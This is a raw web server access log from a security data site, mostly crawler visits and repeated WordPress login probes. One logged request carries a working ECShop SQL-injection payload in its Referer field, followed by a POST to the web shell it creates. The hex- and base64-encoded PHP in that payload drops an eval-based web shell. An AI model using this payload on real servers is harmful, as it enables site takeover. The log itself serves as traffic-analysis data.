41.226.145.101 - - [07/Sep/2018:12:53:50 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
41.226.145.101 - - [07/Sep/2018:12:53:52 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
112.47.16.89 - - [07/Sep/2018:12:56:11 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
112.47.16.89 - - [07/Sep/2018:12:56:58 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (iPhone 84; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 MQQBrowser/7.8.0 Mobile/14G60 Safari/8536.25 MttCustomUA/2 QBWebViewType/1 WKType/1" 
41.223.160.173 - - [07/Sep/2018:13:00:42 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
40.77.167.181 - - [07/Sep/2018:13:01:01 -0700] "GET /self.logs/error.log.2015-08-04.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
138.186.29.76 - - [07/Sep/2018:13:02:14 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
138.186.29.76 - - [07/Sep/2018:13:02:14 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
207.46.13.26 - - [07/Sep/2018:13:03:02 -0700] "GET /self.logs/access.log.2016-11-07.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
202.239.4.79 - - [07/Sep/2018:13:05:19 -0700] "GET /Datasets%2520Description/HTML_Bro_log_2/ HTTP/1.1" 404 340 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:13:06:33 -0700] "GET / HTTP/1.1" 200 12383 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
40.77.167.181 - - [07/Sep/2018:13:07:10 -0700] "GET /self.logs/error.log.2017-02-19.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
202.239.4.79 - - [07/Sep/2018:13:07:11 -0700] "GET /Datasets%2520Description/HTML_Bro_log_1/ HTTP/1.1" 404 340 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
104.222.33.53 - - [07/Sep/2018:13:07:12 -0700] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0" 
104.222.33.53 - - [07/Sep/2018:13:07:12 -0700] "GET / HTTP/1.1" 200 46212 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0" 
121.200.25.248 - - [07/Sep/2018:13:07:46 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "https://www.google.com.au/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
121.200.25.248 - - [07/Sep/2018:13:07:50 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
62.109.19.86 - - [07/Sep/2018:13:08:03 -0700] "HEAD / HTTP/1.1" 200 295 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36" 
62.109.19.86 - - [07/Sep/2018:13:08:04 -0700] "HEAD /license.php HTTP/1.1" 404 275 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36" 
62.109.19.86 - - [07/Sep/2018:13:08:04 -0700] "GET /license.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36" 
64.71.94.2 - - [07/Sep/2018:13:12:05 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
64.71.94.2 - - [07/Sep/2018:13:12:05 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
64.71.94.2 - - [07/Sep/2018:13:12:05 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
64.71.94.2 - - [07/Sep/2018:13:12:06 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
64.71.94.2 - - [07/Sep/2018:13:12:54 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1437 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
64.71.94.2 - - [07/Sep/2018:13:12:54 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/dns.html" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
52.14.175.39 - - [07/Sep/2018:13:13:50 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Safari/602.1" 
46.152.158.7 - - [07/Sep/2018:13:14:20 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
46.152.158.7 - - [07/Sep/2018:13:14:20 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
95.151.238.95 - - [07/Sep/2018:13:22:03 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" 
89.145.92.152 - - [07/Sep/2018:13:26:54 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36" 
114.116.26.211 - - [07/Sep/2018:13:32:21 -0700] "GET //user.php HTTP/1.1" 404 340 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a324e744c6e426f634363734a7a772f63476877494756325957776f4a46395154314e5557324e745a4630704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X" 
114.116.26.211 - - [07/Sep/2018:13:32:21 -0700] "POST //cm.php HTTP/1.1" 404 309 "http://www.secrepo.com//cm.php" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
41.249.110.190 - - [07/Sep/2018:13:32:34 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
41.249.110.190 - - [07/Sep/2018:13:32:34 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
74.220.219.155 - - [07/Sep/2018:13:33:34 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36" 
167.58.156.12 - - [07/Sep/2018:13:34:22 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
167.58.156.12 - - [07/Sep/2018:13:34:22 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
64.86.141.141 - - [07/Sep/2018:13:35:56 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
64.86.141.141 - - [07/Sep/2018:13:35:56 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
64.86.141.141 - - [07/Sep/2018:13:35:56 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
64.86.141.141 - - [07/Sep/2018:13:35:57 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
77.77.230.52 - - [07/Sep/2018:13:36:27 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
77.77.230.52 - - [07/Sep/2018:13:36:27 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
109.92.218.32 - - [07/Sep/2018:13:36:32 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
109.92.218.32 - - [07/Sep/2018:13:36:33 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
204.62.51.162 - - [07/Sep/2018:13:40:39 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
18.222.108.192 - - [07/Sep/2018:13:43:56 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Safari/602.1" 
77.225.159.107 - - [07/Sep/2018:13:47:47 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
77.225.159.107 - - [07/Sep/2018:13:47:47 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
207.46.13.224 - - [07/Sep/2018:13:47:50 -0700] "GET /self.logs/access.log.2018-07-19.gz HTTP/1.1" 200 32820 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
194.204.41.163 - - [07/Sep/2018:13:52:49 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" 
194.204.41.163 - - [07/Sep/2018:13:52:49 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" 
194.204.41.163 - - [07/Sep/2018:13:52:50 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" 
194.204.41.163 - - [07/Sep/2018:13:52:50 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" 
207.46.13.224 - - [07/Sep/2018:13:53:15 -0700] "GET /squid/access.log.gz HTTP/1.1" 200 11033346 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
91.228.167.89 - - [07/Sep/2018:13:54:48 -0700] "GET / HTTP/1.0" 301 461 "https://socialmediascanner.eset.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36" 
91.228.167.89 - - [07/Sep/2018:13:54:48 -0700] "GET / HTTP/1.0" 200 46201 "http://secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36" 
113.171.224.176 - - [07/Sep/2018:13:54:57 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
73.5.7.49 - - [07/Sep/2018:13:55:15 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
73.5.7.49 - - [07/Sep/2018:13:55:15 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
202.239.4.79 - - [07/Sep/2018:13:55:36 -0700] "GET /self.logs/?C=M;O=A HTTP/1.1" 200 12470 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:13:56:22 -0700] "GET /Datasets%20Description/Network/N/A HTTP/1.1" 404 340 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
207.46.13.242 - - [07/Sep/2018:13:56:32 -0700] "GET /self.logs/access.log.2016-07-12.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
202.239.4.79 - - [07/Sep/2018:13:56:48 -0700] "GET /self.logs/2015/ HTTP/1.1" 200 7437 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
50.116.63.129 - - [07/Sep/2018:13:57:04 -0700] "GET / HTTP/1.1" 301 483 "http://finder.cool" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" 
50.116.63.129 - - [07/Sep/2018:13:57:04 -0700] "GET / HTTP/1.1" 200 12383 "http://finder.cool" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" 
202.239.4.79 - - [07/Sep/2018:13:57:12 -0700] "GET /self.logs/?C=N;O=D HTTP/1.1" 200 12006 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:13:57:32 -0700] "GET /self.logs/2016/ HTTP/1.1" 200 7741 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:13:58:01 -0700] "GET /self.logs/?C=D;O=A HTTP/1.1" 200 12014 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:13:58:26 -0700] "GET /self.logs/?C=S;O=A HTTP/1.1" 200 13510 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
162.210.196.97 - - [07/Sep/2018:14:02:43 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.97 - - [07/Sep/2018:14:02:45 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
92.221.46.191 - - [07/Sep/2018:14:12:57 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
92.221.46.191 - - [07/Sep/2018:14:12:57 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
92.221.46.191 - - [07/Sep/2018:14:12:57 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
92.221.46.191 - - [07/Sep/2018:14:12:58 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
92.221.46.191 - - [07/Sep/2018:14:13:56 -0700] "GET /self.logs/ HTTP/1.1" 200 12014 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
92.221.46.191 - - [07/Sep/2018:14:13:56 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
18.222.108.192 - - [07/Sep/2018:14:14:18 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
207.46.13.242 - - [07/Sep/2018:14:16:36 -0700] "GET /self.logs/?C=M;O=D HTTP/1.1" 200 12593 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
93.160.60.32 - - [07/Sep/2018:14:18:42 -0700] "GET / HTTP/1.1" 200 46212 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.0) Match by Siteimprove.com" 
31.184.238.16 - - [07/Sep/2018:14:29:45 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 930799 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47" 
207.46.13.242 - - [07/Sep/2018:14:31:28 -0700] "GET /self.logs/access.log.2017-11-16.gz HTTP/1.1" 200 27198 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.26 - - [07/Sep/2018:14:32:09 -0700] "GET /self.logs/error.log.2015-11-21.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.181 - - [07/Sep/2018:14:39:53 -0700] "GET /self.logs/access.log.2017-08-16.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
168.144.249.125 - - [07/Sep/2018:14:40:55 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36" 
207.46.13.224 - - [07/Sep/2018:14:41:34 -0700] "GET /self.logs/access.log.2017-09-19.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
18.188.94.118 - - [07/Sep/2018:14:44:09 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Firefox/42.0" 
42.236.54.62 - - [07/Sep/2018:14:50:26 -0700] "GET / HTTP/1.1" 200 12383 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" 
52.53.201.78 - - [07/Sep/2018:14:50:33 -0700] "GET / HTTP/1.1" 200 12327 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
151.52.179.167 - - [07/Sep/2018:14:50:44 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
151.52.179.167 - - [07/Sep/2018:14:50:44 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
110.36.181.133 - - [07/Sep/2018:14:52:38 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
183.3.205.29 - - [07/Sep/2018:14:52:41 -0700] "GET //dede/login.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)" 
188.127.160.59 - - [07/Sep/2018:14:54:19 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0" 
188.127.160.59 - - [07/Sep/2018:14:54:20 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0" 
188.127.160.59 - - [07/Sep/2018:14:54:20 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0" 
188.127.160.59 - - [07/Sep/2018:14:54:21 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0" 
187.56.16.129 - - [07/Sep/2018:14:58:20 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
187.56.16.129 - - [07/Sep/2018:14:58:21 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
113.171.224.176 - - [07/Sep/2018:14:59:53 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.165.59.7 - - [07/Sep/2018:15:00:34 -0700] "GET /robots.txt HTTP/1.0" 200 252 "-" "ia_archiver" 
54.165.59.7 - - [07/Sep/2018:15:00:34 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.0" 200 3867 "-" "ia_archiver" 
207.46.13.224 - - [07/Sep/2018:15:03:58 -0700] "GET /self.logs/access.log.2017-03-29.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
123.125.143.19 - - [07/Sep/2018:15:05:02 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
123.125.143.19 - - [07/Sep/2018:15:05:04 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7372 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
208.80.194.30 - - [07/Sep/2018:15:05:57 -0700] "GET / HTTP/1.0" 200 46201 "-" "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/9.0.1" 
43.252.140.183 - - [07/Sep/2018:15:07:42 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
43.252.140.183 - - [07/Sep/2018:15:07:43 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
181.188.53.114 - - [07/Sep/2018:15:11:55 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
181.188.53.114 - - [07/Sep/2018:15:11:56 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
18.191.165.71 - - [07/Sep/2018:15:13:48 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Firefox/42.0" 
209.17.96.234 - - [07/Sep/2018:15:16:21 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)" 
66.102.7.32 - - [07/Sep/2018:15:21:34 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.7.63 - - [07/Sep/2018:15:21:35 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
148.251.123.46 - - [07/Sep/2018:15:23:18 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208" 
148.251.123.46 - - [07/Sep/2018:15:23:18 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208" 
138.197.3.83 - - [07/Sep/2018:15:23:54 -0700] "GET / HTTP/1.1" 200 12383 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:13 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:46 -0700] "GET /data HTTP/1.1" 404 340 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:46 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
